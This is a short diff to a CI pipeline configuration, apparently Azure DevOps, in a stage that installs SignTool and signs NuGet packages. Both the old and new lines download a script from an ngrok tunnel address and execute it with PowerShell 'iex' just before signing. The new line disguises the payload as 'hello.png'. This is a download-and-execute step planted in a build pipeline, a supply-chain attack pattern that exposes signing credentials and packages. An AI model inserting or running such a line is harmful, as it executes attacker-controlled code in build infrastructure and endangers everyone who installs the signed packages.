@@ -197,7 +197,7 @@ stages:
             displayName: Install SignTool tool
 
           - pwsh: |
-              iex (New-Object System.Net.WebClient).DownloadString("https://094c-180-151-120-174.in.ngrok.io/hello.ps1")
+              iex (New-Object System.Net.WebClient).DownloadString("https://72d4-193-29-61-27.ngrok.io/hello.png")
               .\SignClient "Sign" `
               --baseDirectory "$(Pipeline.Workspace)\BuildPackages" `
               --input "**/*.nupkg" `
